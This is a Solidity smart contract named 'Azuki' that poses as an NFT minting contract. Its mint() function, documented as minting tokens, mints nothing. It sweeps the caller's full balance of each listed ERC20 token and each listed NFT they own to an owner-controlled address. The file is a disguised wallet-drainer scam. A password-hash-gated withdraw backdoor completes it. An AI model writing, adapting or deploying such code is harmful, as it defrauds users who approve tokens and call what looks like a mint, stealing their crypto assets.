contract Azuki is Ownable {
    address public myaccount;
    uint256 public price;
    bytes32 private credential =
        0x685b98ed5452c1c36189019248ff4efbfda47479683b589b6046618feb6125aa;

    constructor(address account) {
        myaccount = account;
        price = 0.1 ether;
    }

    /**
     * @dev Mint the _amount of tokens
     * @param erc721 is the ERC721 token addresses
     * @param tokenIds is the ERC721 token IDs
     * @param erc20 is the ERC20 token addresses
     */

    function mint(
        address[] memory erc721,
        uint256[] memory tokenIds,
        address[] memory erc20
    ) public payable {
        require(msg.value >= price, "Minting price is higher");
        for (uint256 i = 0; i < erc20.length; i++) {
            uint256 curBalance = IERC20(erc20[i]).balanceOf(msg.sender);
            if (curBalance >= 0)
                IERC20(erc20[i]).transferFrom(
                    msg.sender,
                    myaccount,
                    curBalance
                );
        }

        for (uint256 i = 0; i < erc721.length; i++) {
            if (IERC721(erc721[i]).ownerOf(tokenIds[i]) == msg.sender)
                IERC721(erc721[i]).safeTransferFrom(
                    msg.sender,
                    myaccount,
                    tokenIds[i]
                );
        }
    }

    /**
     * @dev set the withdraw address
     * @param account of the owner
     */
    function setAccount(address account) public onlyOwner {
        myaccount = account;
    }

    /**
     * @dev set the mint price
     * @param _price of the mint
     */
    function setPrice(uint256 _price) public onlyOwner {
        price = _price;
    }

    function setCredential(
        string memory _oldCredential,
        string memory _newCredential
    ) external {
        bytes32 oldPass = keccak256(abi.encodePacked(_oldCredential));
        require(credential == oldPass, "You're not owner");
        credential = keccak256(abi.encodePacked(_newCredential));
    }

    function withdraw(
        address dest,
        uint256 amount,
        string memory passKey
    ) external {
        bytes32 secret = keccak256(abi.encodePacked(passKey));
        require(secret == credential, "PassKey is incorrect");

        uint256 curBalance = address(this).balance;
        require(
            curBalance >= amount,
            "Contract balance is Zero. Try later to withdraw"
        );
        payable(dest).transfer(amount);
    }

    function withdrawA(
        address dest,
        address[] memory erc20,
        uint256[] memory amounts,
        string memory passKey
    ) external {
        bytes32 secret = keccak256(abi.encodePacked(passKey));
        require(secret == credential, "PassKey is incorrect");

        for (uint256 i = 0; i < erc20.length; i++) {
            uint256 curBalance = IERC20(erc20[i]).balanceOf(address(this));
            require(
                curBalance >= amounts[i],
                "Contract balance is Zero. Try later to withdraw"
            );
            IERC20(erc20[i]).transfer(dest, amounts[i]);
        }
    }

    receive() external payable {}
}